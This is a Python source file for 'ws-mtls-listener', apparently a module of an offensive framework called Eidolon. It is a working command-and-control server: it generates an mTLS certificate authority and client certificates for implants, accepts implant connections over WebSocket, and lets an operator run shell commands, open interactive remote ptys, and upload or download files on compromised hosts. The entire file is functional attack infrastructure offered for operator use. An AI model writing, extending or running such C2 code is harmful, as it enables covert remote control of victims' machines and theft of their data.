#!/usr/bin/env python3
"""
ws-mtls-listener — internal C2 listener for Eidolon (WebSocket + mTLS)
======================================================================

A complete, working listener module: a WSS server whose implants
authenticate with a client certificate (mTLS) AND a shared token.
Pairs with the `poly-builder` payload module (Nim / Go implants).

PROTOCOL — "ws-json-mtls/1" (one JSON object per WS text frame):
  implant -> listener, first frame (hello):
      {"id": .., "implant": .., "os": .., "arch": ..,
       "user": .., "host": .., "token": <shared secret>}
  listener -> implant (commands):
      {"id": N, "cmd": "shell",    "arg": "<command>"}
      {"id": N, "cmd": "sysinfo"}
      {"id": N, "cmd": "upload",   "path": .., "data": <b64>}
      {"id": N, "cmd": "download", "path": ..}
      {"id": N, "cmd": "die"}
      {"id": N, "cmd": "pty_open", "arg": "<cols>,<rows>"}   (go implants, linux)
      {"cmd": "pty_in", "data": <b64>}     raw bytes into the pty
      {"cmd": "pty_sz", "arg": "<cols>,<rows>"}
  implant -> listener (replies):
      {"id": N, "type": "result", "out": ..}
      {"id": N, "type": "dl", "path": .., "data": <b64>}
      {"type": "pty_out", "data": <b64>}    streamed pty chunks (go implants)
      {"type": "pty_exit"}

mTLS KEY MATERIAL (first run generates it, then reuses):
  <cert_dir>/ca.crt / ca.key        self-signed 12-year authority
  <cert_dir>/server.crt / server.key  TLS server identity
  <cert_dir>/client.crt / client.key  implant identity (builder embeds it)
  cert_dir default: this module's _certs/ (underscore = invisible to scanner)

OPERATOR FLOW:
  install_local default-modules/ws-mtls-listener ; trust ws-mtls-listener
  use ws-mtls-listener ; set port 8443 ; run            (auto-backgrounds)
  install_local default-modules/poly-builder ; gen poly-builder
  set lang go ; set name my-implant ; run
  (implant dials wss://... and presents its client certificate)
  c2 sessions ; use <sid> ; shell whoami ; upload ... ; back ; kill <id>

INNER-SHELL VERBS:
  shell <cmd>        run a command, output streamed back (client shell)
  pty                open an INTERACTIVE shell on the implant (go implants
                     on linux) — the local terminal goes RAW and every byte
                     you type is streamed 1:1 into the remote pty: remote
                     echo, history, Tab completion, Ctrl+C, full-screen apps
                     (vim/htop) all work; the pty follows YOUR terminal size
                     and live-resizes (SIGWINCH). Ctrl+] drops back to line
                     mode (the remote shell keeps running); .q leaves pty
                     mode entirely. `pty` again opens a fresh pty.
  sysinfo            ask the implant for a fingerprint blob
  upload <l> <r>     send a local file (realpath-contained, <= 4 MiB)
  download <r> <l>   fetch a remote file to <l> (0o600)
  die                tell the implant to exit
"""

import asyncio
import base64
import datetime
import ipaddress
import json
import codecs
import os
import posixpath
import secrets
import select
import signal
import ssl
import sys
import threading

from eidolon.utils import ok, err, info, warn

NAME        = "ws-mtls-listener"
VERSION     = "1.0.0"
DESCRIPTION = "Internal C2 listener — WebSocket over TLS with mTLS implants"
CATEGORY    = "c2"
MODULE_TYPE = "listener"
AUTHOR      = "ghost-union"

RANK        = "great"
TARGETS     = ["operator ops: needs `websockets` + `cryptography` installed"]
REFERENCES  = ["URL:https://github.com/null-flame/Eidolon"]

OPTIONS = {
    "host":          {"value": "0.0.0.0", "required": False,
                      "desc": "bind address"},
    "port":          {"value": 8443,      "required": True,
                      "desc": "wss port (0 = auto-pick)"},
    "cert_dir":      {"value": "",
                      "required": False,
                      "desc": "key material dir (empty = this module's _certs/)"},
    "regenerate":    {"value": False,     "required": False,
                      "desc": "wipe + regenerate the CA and certificates"},
    "require_token": {"value": True,      "required": False,
                      "desc": "also check hello.token (on top of mTLS)"},
    "shell":         {"value": "/bin/sh", "required": False,
                      "desc": "advisory default shell for implants"},
}

MAX_UPLOAD = 4 << 20           # one-frame cap, matches the server's max_size
TAGS       = ("ws-json-mtls",)

_SERVER  = None
_TOKEN   = ""
_PROFILE = None


# ============================================================ certificates

def _on_load():
    for lib, pip in (("websockets", "websockets>=13"),
                     ("cryptography", "cryptography>=42")):
        try:
            __import__(lib)
        except ImportError:
            warn(f"[{NAME}] missing dependency: pip install {pip}  "
                 f"(module business — the framework never installs anything)")


def _ensure_material(cert_dir, regenerate=False):
    """Generate (once) and return the mTLS key material as a path dict."""
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID

    os.makedirs(cert_dir, exist_ok=True)
    paths = {}
    for base in ("ca", "server", "client"):
        paths[f"{base}_crt"] = os.path.join(cert_dir, f"{base}.crt")
        paths[f"{base}_key"] = os.path.join(cert_dir, f"{base}.key")

    have = all(os.path.exists(paths[f"{k}_crt"]) and os.path.exists(paths[f"{k}_key"])
               for k in ("ca", "server", "client"))
    if have and not regenerate:
        return paths
    if regenerate:
        for p in paths.values():
            if os.path.exists(p):
                os.remove(p)

    now = datetime.datetime.now(datetime.timezone.utc)
    not_before, not_after = now - datetime.timedelta(days=1), now + datetime.timedelta(days=3650)

    def _write(path, data, private):
        with open(path, "wb") as f:
            f.write(data)
        os.chmod(path, 0o600 if private else 0o644)

    def _pem_cert(cert):
        return cert.public_bytes(serialization.Encoding.PEM)

    def _pem_key(key):
        return key.private_bytes(serialization.Encoding.PEM,
                                 serialization.PrivateFormat.TraditionalOpenSSL,
                                 serialization.NoEncryption())

    def _name(cn):
        return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])

    ca_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    ca = (x509.CertificateBuilder()
          .subject_name(_name("Eidolon Wraith CA"))
          .issuer_name(_name("Eidolon Wraith CA"))
          .public_key(ca_key.public_key())
          .serial_number(x509.random_serial_number())
          .not_valid_before(not_before).not_valid_after(not_after)
          .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
          .sign(ca_key, hashes.SHA256()))

    server_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    sans = [x509.DNSName("localhost")]
    try:
        sans.append(x509.IPAddress(ipaddress.ip_address(_bound_ip())))
    except ValueError:
        pass
    server = (x509.CertificateBuilder()
              .subject_name(_name("wraith-server"))
              .issuer_name(ca.subject)
              .public_key(server_key.public_key())
              .serial_number(x509.random_serial_number())
              .not_valid_before(not_before).not_valid_after(not_after)
              .add_extension(x509.SubjectAlternativeName(sans), critical=False)
              .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
              .sign(ca_key, hashes.SHA256()))

    client_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    client = (x509.CertificateBuilder()
              .subject_name(_name("eidolon-implant"))
              .issuer_name(ca.subject)
              .public_key(client_key.public_key())
              .serial_number(x509.random_serial_number())
              .not_valid_before(not_before).not_valid_after(not_after)
              .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
              .add_extension(x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.CLIENT_AUTH]),
                             critical=False)
              .sign(ca_key, hashes.SHA256()))

    for cert, key, base in ((ca, ca_key, "ca"), (server, server_key, "server"),
                            (client, client_key, "client")):
        _write(paths[f"{base}_crt"], _pem_cert(cert), False)
        _write(paths[f"{base}_key"], _pem_key(key), True)
    return paths


def _bound_ip():
    import socket as _socket
    s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
    try:
        s.settimeout(0); s.connect(("127.0.0.1", 1)); return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def _tls_server(paths):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.load_cert_chain(paths["server_crt"], paths["server_key"])
    ctx.load_verify_locations(cafile=paths["ca_crt"])
    ctx.verify_mode = ssl.CERT_REQUIRED          # the M of mTLS
    return ctx


# ============================================================ profile

class _Profile:
    """Published for builders: .url/.token/.tags plus cert material paths."""

    def __init__(self, url, token, tags, paths):
        self.url, self.token, self.tags = url, token, tags
        self.ca_crt, self.client_crt, self.client_key = \
            paths["ca_crt"], paths["client_crt"], paths["client_key"]


# ============================================================ session plumbing

class _SessionCtx:
    """Everything one connected implant needs: socket, pending requests, send."""

    def __init__(self, ws, sess):
        self.ws = ws
        self.sess = sess
        self.loop = asyncio.get_running_loop()
        self.queue: asyncio.Queue = asyncio.Queue()
        self.seq = 0
        self.pending: dict = {}          # req id -> {"verb": .., "local": ..}
        self.pty = False                 # true while lines flow into a pty
        self.pty_evt = None              # set when the pty_open ack lands
        self.pty_dec = codecs.getincrementaldecoder("utf-8")("replace")

    def send_cmd(self, obj):
        line = json.dumps(obj)
        try:
            self.loop.call_soon_threadsafe(self.queue.put_nowait, line)
        except RuntimeError:
            pass                       # listener loop already closed


async def _writer(ctx: _SessionCtx):
    while True:
        line = await ctx.queue.get()
        try:
            await ctx.ws.send(line)
        except Exception:
            break


def _complete(text, line):
    return [w for w in ("help", "shell", "pty", "sysinfo", "upload", "download", "die")
            if w.startswith(text)]


def _pty_send(ctx, data):
    if data:
        ctx.send_cmd({"cmd": "pty_in",
                      "data": base64.b64encode(data).decode()})


def _pty_raw_mode(ctx):
    """Take the local terminal raw and stream bytes 1:1 into the remote
    pty — ssh-style. Remote echo / completion / Ctrl+C / full-screen apps
    all behave; Ctrl+] (0x1d) drops back to line mode with the remote
    shell still running. Falls back to plain line forwarding when there
    is no local tty."""
    if not os.isatty(0):
        info(f"[{ctx.sess.sid}] no local tty — line mode (each line you "
             "type still reaches the pty; .q leaves)")
        return
    try:
        import termios
        import tty
        old = termios.tcgetattr(0)
    except Exception as e:
        info(f"[{ctx.sess.sid}] raw mode unavailable ({e}) — line mode")
        return
    tty.setraw(0, termios.TCSANOW)
    prev_winch = signal.getsignal(signal.SIGWINCH)

    def _resized(signum, frame):
        try:
            sz = os.get_terminal_size(0)
            ctx.send_cmd({"cmd": "pty_sz", "arg": f"{sz.columns},{sz.lines}"})
        except Exception:
            pass

    try:
        signal.signal(signal.SIGWINCH, _resized)
    except ValueError:
        prev_winch = None               # not the main thread — skip resize
    info(f"[{ctx.sess.sid}] raw pty live — Ctrl+] back to verbs, remote "
         "shell keeps running")
    try:
        while ctx.pty:
            r, _, _ = select.select([0], [], [], 0.25)
            if r:
                data = os.read(0, 4096)
                if not data:
                    break
                idx = data.find(b"\x1d")
                if idx >= 0:
                    _pty_send(ctx, data[:idx])
                    break
                _pty_send(ctx, data)
    finally:
        termios.tcsetattr(0, termios.TCSADRAIN, old)
        if prev_winch is not None:
            try:
                signal.signal(signal.SIGWINCH, prev_winch)
            except ValueError:
                pass
    if ctx.pty:
        info(f"[{ctx.sess.sid}] raw off — line mode (remote shell still "
             "live); .q leaves pty mode")


def _enter(sh, sctx, on_exit_note):
    sh.enter_subshell(on_line=lambda ln: _on_operator_line(sctx, ln),
                      completer=_complete,
                      prompt_fn=lambda: "%.8s ❯ " % sctx.sess.sid,
                      on_exit=lambda: info(on_exit_note))


def _on_operator_line(ctx, line):
    """Sync console side — parse the verb, hand the implant a JSON command."""
    parts = line.strip().split()
    if not parts:
        return
    verb, args = parts[0].lower(), parts[1:]
    if ctx.pty and verb != ".q":
        ctx.send_cmd({"cmd": "pty_in",
                      "data": base64.b64encode((line + "\n").encode()).decode()})
        return
    if verb in ("help", "?"):
        info("verbs: shell <cmd> · pty (interactive, .q back) · sysinfo · "
             "upload <local> <remote> · download <remote> <local> · die")
    elif verb == ".q":
        if ctx.pty:
            ctx.pty = False
            info(f"[{ctx.sess.sid}] left pty — verbs again (help lists them)")
        else:
            info("not in pty mode — `pty` opens the interactive shell")
    elif verb == "shell" or verb == "!":
        ctx.seq += 1
        ctx.pending[ctx.seq] = {"verb": "shell"}
        ctx.send_cmd({"id": ctx.seq, "cmd": "shell", "arg": " ".join(args)})
    elif verb == "sysinfo":
        ctx.seq += 1
        ctx.pending[ctx.seq] = {"verb": "sysinfo"}
        ctx.send_cmd({"id": ctx.seq, "cmd": "sysinfo"})
    elif verb == "pty":
        ctx.seq += 1
        ctx.pending[ctx.seq] = {"verb": "pty"}
        ctx.pty_evt = threading.Event()
        try:
            sz = os.get_terminal_size(sys.stdout.fileno())
            arg = f"{sz.columns},{sz.lines}"
        except (OSError, ValueError):
            arg = "120,32"
        ctx.send_cmd({"id": ctx.seq, "cmd": "pty_open", "arg": arg})
        if not ctx.pty_evt.wait(timeout=15):
            ctx.pty = False
            warn(f"[{ctx.sess.sid}] no pty ack in 15s — implant may not "
                 "support it (rebuild + redeploy the go implant)")
        ctx.pty_evt = None
        if ctx.pty:
            _pty_raw_mode(ctx)
    elif verb == "upload" and len(args) >= 2:
        local, remote = args[0], args[1]
        try:
            real = os.path.realpath(local)
            if not os.path.isfile(real):
                raise FileNotFoundError(real)
            if os.path.getsize(real) > MAX_UPLOAD:
                raise ValueError(f"file exceeds {MAX_UPLOAD >> 20} MiB single-frame cap")
            with open(real, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            ctx.seq += 1
            ctx.pending[ctx.seq] = {"verb": "upload"}
            ctx.send_cmd({"id": ctx.seq, "cmd": "upload",
                          "path": posixpath.normpath("/".join(remote.split("\\"))), "data": data})
        except Exception as e:
            err(f"upload aborted: {e}")
    elif verb == "download" and len(args) >= 2:
        ctx.seq += 1
        ctx.pending[ctx.seq] = {"verb": "download", "local": args[1]}
        ctx.send_cmd({"id": ctx.seq, "cmd": "download", "path": args[0]})
    elif verb == "die":
        ctx.send_cmd({"cmd": "die"})
    else:
        info("unknown verb — `help` lists them")


def _on_frame(ctx, raw):
    """Async side — a frame arrived from the implant."""
    try:
        msg = json.loads(raw)
    except (ValueError, TypeError):
        warn(f"[{ctx.sess.sid}] non-JSON frame ({len(raw)} bytes) — dropped")
        return
    rid, rtype = msg.get("id"), msg.get("type")
    pend = ctx.pending.pop(rid, None) if isinstance(rid, int) else None
    if rtype == "result":
        out = str(msg.get("out", ""))
        if pend and pend["verb"] == "sysinfo":
            for ln in out.splitlines():
                info(f"[{ctx.sess.sid}] {ln}")
        elif pend and pend["verb"] == "pty":
            evt = ctx.pty_evt
            ctx.pty_evt = None
            if out.startswith("pty up"):
                ctx.pty = True
                info(f"[{ctx.sess.sid}] {out}")
            else:
                ctx.pty = False          # stub/nim rejection — stay in verbs
                for ln in out.splitlines() or ["(no output)"]:
                    info(f"[{ctx.sess.sid}] {ln}")
            if evt:
                evt.set()
        else:
            for ln in out.splitlines() or ["(no output)"]:
                info(f"[{ctx.sess.sid}] {ln}")
    elif rtype == "pty_out":
        try:
            data = base64.b64decode(msg.get("data", ""))
        except Exception:
            data = b""
        if data:
            sys.stdout.write(ctx.pty_dec.decode(data))
            sys.stdout.flush()
    elif rtype == "pty_exit":
        ctx.pty = False
        info(f"[{ctx.sess.sid}] pty exited — verbs again (help lists them)")
    elif rtype == "dl" and pend:
        try:
            local = os.path.realpath(pend["local"])
            data = base64.b64decode(msg.get("data", ""))
            with open(local, "wb") as f:
                f.write(data)
            os.chmod(local, 0o600)
            ok(f"downloaded {len(data)} bytes -> {local}")
        except Exception as e:
            err(f"save failed: {e}")
    else:
        info(f"[{ctx.sess.sid}] {raw[:400]}")


# ============================================================ connection handler

async def _peer_fingerprint(ws):
    try:
        so = ws.transport.get_extra_info("ssl_object")
        der = so.getpeercert(binary_form=True)
        if der:
            from cryptography.hazmat.primitives import hashes as _h
            return _h.sha256()(der).hexdigest()[:16]
    except Exception:
        pass
    return "?"


async def handle(ws):
    """One coroutine per implant; handler must answer before any frame."""
    peer = str(ws.remote_address or "?")
    try:
        raw = await asyncio.wait_for(ws.recv(), 10)
        hello = json.loads(raw)
    except Exception:
        await ws.close(code=4001, reason="no hello")
        return err(f"{peer}: handshake failed (no/invalid hello in 10s)")

    fp = await _peer_fingerprint(ws)
    if _PROFILE is not None and str(_PROFILE.token):
        if str(hello.get("token", "")) != _PROFILE.token:
            await ws.close(code=4002, reason="bad token")
            return warn(f"{peer} presented a VALID client certificate "
                        f"({fp}) but a WRONG token — possible cert theft")

    from eidolon.wraith.sessions import default_registry
    sid = str(hello.get("id") or f"impl-{fp[:8]}")
    reg = default_registry()
    sess = reg.register({
        "sid":     sid[:48],
        "implant": str(hello.get("implant", "unknown")),
        "os":      str(hello.get("os",  "unknown")),
        "arch":    str(hello.get("arch","unknown")),
        "user":    str(hello.get("user","unknown")),
        "host":    str(hello.get("host","unknown")),
        "tags":    TAGS,
    }, addr=peer)

    ctx = _SessionCtx(ws, sess)
    writer = asyncio.create_task(_writer(ctx))
    sess.interact = lambda sh: _enter(sh, ctx, "left the session shell")
    EIDOLON_SHELL._c2_on_event(("up", sess))
    ok(f"implant connected: {sess.implant}@{sess.host} ({sess.os}/{sess.arch}) "
       f"sid={sess.sid} cert={fp} addr={peer}")

    try:
        async for raw in ws:
            _on_frame(ctx, raw)
    except Exception:
        pass
    finally:
        writer.cancel()
        ctx.pty = False
        if ctx.pty_evt:
            ctx.pty_evt.set()
        EIDOLON_SHELL._c2_on_event(("down", sess))
        info(f"implant gone: {sess.sid} ({peer})")


# ============================================================ run / stop

async def run(opts):
    global _SERVER, _PROFILE, _TOKEN
    import websockets
    from websockets.asyncio.server import serve

    host = str(opts.get("host", "0.0.0.0"))
    port = int(opts.get("port", 0) or 0)
    cert_dir = str(opts.get("cert_dir", "")).strip() or \
        os.path.join(os.path.dirname(__eidolon_path__), "_certs")

    paths = _ensure_material(cert_dir, regenerate=bool(opts.get("regenerate")))
    _TOKEN = secrets.token_hex(16)
    _PROFILE = _Profile("", _TOKEN, TAGS, paths)

    server = await serve(handle, host, port, ssl=_tls_server(paths),
                         max_size=MAX_UPLOAD, ping_interval=20, ping_timeout=20)
    _SERVER = server

    real = server.sockets[0].getsockname()[:2]
    _PROFILE.url = "wss://%s:%d" % real
    ca_fp = _fp_of(paths["ca_crt"])
    EIDOLON_SHELL.wraith_listener = _PROFILE

    ok(f"{NAME} serving {_PROFILE.url} (mTLS REQUIRED · token {_TOKEN[:8]}…)")
    info(f"CA fingerprint: {ca_fp}")
    info(f"client cert for implants: {paths['client_crt']}")
    info("next: gen poly-builder · set lang go|nim · set name <name> · run")
    async with server:
        await server.serve_forever()


def _fp_of(crt_path):
    try:
        from cryptography import x509 as _x
        from cryptography.hazmat.primitives import hashes as _h
        with open(crt_path, "rb") as f:
            cert = _x.load_pem_x509_certificate(f.read())
        return cert.fingerprint(_h.SHA256()).hex()[:24]
    except Exception:
        return "?"


def stop():
    if _SERVER is not None:
        try:
            _SERVER.close()
        except Exception:
            pass
